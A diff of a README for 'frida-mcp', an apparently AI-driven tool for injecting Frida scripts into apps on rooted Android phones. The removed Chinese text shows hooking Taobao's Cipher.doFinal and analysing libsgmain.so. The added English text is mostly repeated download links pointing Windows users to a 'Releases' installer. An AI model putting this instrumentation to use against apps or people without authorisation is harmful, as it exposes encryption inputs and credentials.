@@ -1,115 +1,191 @@
-# Frida Agent MCP
+# 🛠️ frida-mcp - Android Analysis Made Simple
 
-AI 驱动的 Android 动态分析工具。通过 MCP (Model Context Protocol) 让 AI 直接操控 Frida，实现自动化逆向分析。
+[![Download](https://img.shields.io/badge/Download-frida--mcp-brightgreen?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp)
+
+---
+
+## 📋 What is frida-mcp?
+
+frida-mcp helps you analyze Android apps by automating Frida using AI commands. It connects your Android phone to your computer, runs analysis scripts automatically, and gives you results without needing to run commands yourself.
+
+This tool works with rooted Android phones running Magisk and the zygisk-gadget module. It uses a server called MCP (Model Context Protocol) that talks to Frida and controls it to inspect apps dynamically.
+
+---
+
+## 🖥️ System Requirements
+
+Before starting, check the following:
+
+- Windows 10 or later.
+- Python 3.10 or higher installed on your PC.
+- An Android phone with root access.
+- Magisk installed on your Android phone.
+- The zygisk-gadget Magisk module installed and set to use port 14725.
+- ADB (Android Debug Bridge) installed and able to connect your phone to your PC.
+
+If you don’t have Python or ADB installed, you will need to install them first. Both are free and easy to get.
+
+---
+
+## 🚀 How to Download frida-mcp
+
+Click the large button below to **visit the GitHub page** where you can download frida-mcp and find setup files.
+
+[![Download frida-mcp](https://img.shields.io/badge/Download-frida--mcp-4c9aff?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp)
+
+On the GitHub page:
+
+1. Look for the “Releases” section to find the latest version.
+2. Download the package or installer suitable for Windows.
+3. Follow instructions there to install the software.
+
+---
+
+## ⚙️ Installation and Setup on Windows
+
+After downloading, follow these steps to install and configure frida-mcp on your PC:
+
+1. **Install Python packages**
+
+   Open your Command Prompt (search for "cmd" in Windows Start menu).
+
+   Navigate to the folder where you downloaded frida-mcp, or if you have the source code, open Command Prompt there.
+
+   Run this command to install frida-mcp and its dependencies:
+
+   ```
+   pip install .
+   ```
+
+   This installs the main program and tools you will need.
+
+2. **Run Setup**
+
+   After installation completes, run this command to perform automatic setup:
+
+   ```
+   frida-mcp-setup
+   ```
+
+   This command will register frida-mcp with MCP and install necessary “Skills” for it to work smoothly.
+
+3. **Manual Configuration (optional)**
+
+   If automatic setup fails, you can edit the file `~/.claude.json` manually:
+
+   ```json
+   {
+     "mcpServers": {
+       "frida-agent": {
+         "command": "frida-mcp"
+       }
+     }
+   }
+   ```
+
+   Save the file and retry running frida-mcp.
+
+4. **Connect your phone**
+
+   Make sure your Android phone is connected via USB with USB debugging enabled.
+
+   Confirm that `adb` can detect your device by running:
+
+   ```
+   adb devices
+   ```
+
+   Your device should show up on the list.
+
+---
+
+## 🔌 Connecting frida-mcp to your Android Phone
+
+frida-mcp uses ADB to talk to the zygisk-gadget module on your phone.
+
+To establish this connection:
+
+- Run the command:
+
+  ```
+  frida-mcp connect
+  ```
+
+- This will forward ports and allow communication between your PC and phone.
+
+- Check the connection by listing third-party apps on your device:
+
+  ```
+  frida-mcp list_apps
+  ```
+
+- If your apps show up, the connection works.
+
+---
+
+## 📂 Main frida-mcp Commands
+
+Here are the main commands you will use when running frida-mcp:
+
+| Command          | What it Does                                         |
+|------------------|-----------------------------------------------------|
+| `connect`        | Opens ADB port forwarding to connect to zygisk-gadget. |
+| `list_apps`      | Shows third-party apps installed on your device.    |
+| `execute`        | Injects a Frida script into the running app. You can write the script directly or provide a file path. |
+| `spawn_and_inject` | Stops an app, restarts it, and injects a script in one step. Useful when hooking app startup. |
+| `get_messages`   | Shows output from the injected scripts. Supports paging and file backup. |
+| `logcat`         | Displays Android system logs to help find errors or crashes. |
+| `launch_app`     | Starts an app you specify.                           |
+| `kill_app`       | Forces an app to stop.                               |
+| `reconnect`      | Restarts the connection if frida-mcp crashes.        |
+| `detach`         | Disconnects the current script injection session.   |
+
+---
+
+## 📥 Download frida-mcp Again or Update
+
+If you need to download frida-mcp again or get the latest version:
+
+- Visit this page:  
+  https://github.com/Gindhar2112/frida-mcp
+
+- Go to the "Releases" tab.
+- Download the latest files.
+- Replace old files with new ones if you have a manual installation.
+
+Then repeat the installation commands as above to update your setup.
+
+---
+
+## 🔧 Additional Tips
+
+- Your phone must remain connected and unlocked during use.
+- If you encounter errors with connection, rerun `frida-mcp reconnect` or check ADB connection.
+- Use `frida-mcp logcat` to monitor crashes or issues in real time.
+- If an app does not respond as expected, try `spawn_and_inject` to restart and inject fresh.
+- Keep Python and ADB updated for best compatibility.
+
+---
+
+## 📖 Resources
+
+- Magisk Root: https://github.com/topjohnwu/Magisk  
+- zygisk-gadget Module: https://github.com/aspect4/zygisk-gadget  
+- Python: https://www.python.org/downloads/windows/  
+- ADB Setup Guide: https://developer.android.com/studio/command-line/adb
+
+---
+
+## 📂 How frida-mcp Works
+
+The flow looks like this:
 
 ```
-AI (Claude) → MCP Server → Frida CLI → zygisk-gadget (手机) → 结果返回
+AI (Claude) → MCP Server → Frida CLI → zygisk-gadget (phone) → Results returned
 ```
 
-## 前提条件
+This means AI sends commands to MCP, which controls Frida. Frida works with the gadget installed on the phone to analyze apps and send data back to you.
 
-- Python >= 3.10
-- Android 手机已 root，安装 [Magisk](https://github.com/topjohnwu/Magisk)
-- 安装 [zygisk-gadget](https://github.com/aspect4/zygisk-gadget) Magisk 模块（固定端口 14725）
-- ADB 已连接手机
+---
 
-## 安装
-
-```bash
-pip install .
-```
-
-安装后运行一键配置（注册 MCP + 安装 Skills）：
-
-```bash
-frida-mcp-setup
-```
-
-或手动配置，在 `~/.claude.json` 中添加：
-
-```json
-{
-  "mcpServers": {
-    "frida-agent": {
-      "command": "frida-mcp"
-    }
-  }
-}
-```
-
-## MCP Tools
-
-| 工具 | 说明 |
-|------|------|
-| `connect` | 建立 ADB 端口转发，连接 zygisk-gadget |
-| `list_apps` | 列出设备上的第三方应用 |
-| `execute` | 注入 Frida JS 脚本到前台应用（支持 `script` 内联 / `script_file` 文件路径） |
-| `spawn_and_inject` | 杀死 → 重启 → 注入，一步完成（适用于需要启动时 hook 的场景） |
-| `get_messages` | 获取注入脚本的输出（支持分页、自动文件回退） |
-| `logcat` | 查看 Android 日志，排查崩溃原因 |
-| `launch_app` | 启动指定应用 |
-| `kill_app` | 强制停止指定应用 |
-| `reconnect` | 重新建立连接（崩溃后恢复） |
-| `detach` | 断开当前注入会话 |
-
-## Skills（Claude Code 技能）
-
-安装后可在 Claude Code 中使用：
-
-- **`/reverse-analyze`** — 逆向分析与动态 Hook，结合 IDA 静态分析 + Frida 动态验证
-- **`/trace-vm`** — VM 保护函数分析，指导人工 trace 并由 AI 分析结果
-
-## 使用示例
-
-### 基本 Hook 流程
-
-```
-用户: hook 淘宝的 Cipher.doFinal 看看加密参数
-
-AI 自动执行:
-1. connect()                    — 建立连接
-2. spawn_and_inject(            — 启动并注入
-     "com.taobao.taobao",
-     "Java.perform(function() { ... })"
-   )
-3. 提示用户触发操作              — "请点击登录按钮"
-4. get_messages()               — 获取 hook 结果
-5. 分析并展示加密参数和返回值
-```
-
-### 结合 IDA 静态分析
-
-```
-用户: /reverse-analyze 分析 libsgmain.so 中 0x1234 处的函数
-
-AI 自动执行:
-1. IDA MCP 反编译目标函数，分析参数和返回值类型
-2. 生成 Frida Hook 脚本
-3. spawn_and_inject 注入
-4. 交叉验证静态分析和动态结果
-```
-
-## 工作原理
-
-本工具使用 **Frida CLI** 而非 frida-python API，通过 `frida -H 127.0.0.1:14725 -F -l script.js -o output.txt` 注入脚本：
-
-- 脚本中的 `send()` 调用自动转换为 `console.log(JSON.stringify())`
-- 所有脚本自动包裹 try-catch 防止注入崩溃
-- 输出通过 `-o` 标志写入文件，`get_messages` 时停止 frida 进程以刷新文件
-
-## 项目结构
-
-```
-src/frida_mcp/
-├── server.py       # MCP Server 入口，10 个工具注册
-├── connection.py   # Frida CLI 连接管理，进程生命周期
-├── executor.py     # 脚本预处理（send 转换、try-catch 包裹）
-├── messages.py     # 消息分页、大数据自动文件回退
-├── logcat.py       # Android logcat 封装
-├── setup.py        # 一键安装配置
-└── skills/         # Claude Code 技能模板
-```
-
-## License
-
-MIT
+# [![Download](https://img.shields.io/badge/Get%20frida--mcp-blueviolet?style=for-the-badge&logo=github)](https://github.com/Gindhar2112/frida-mcp)
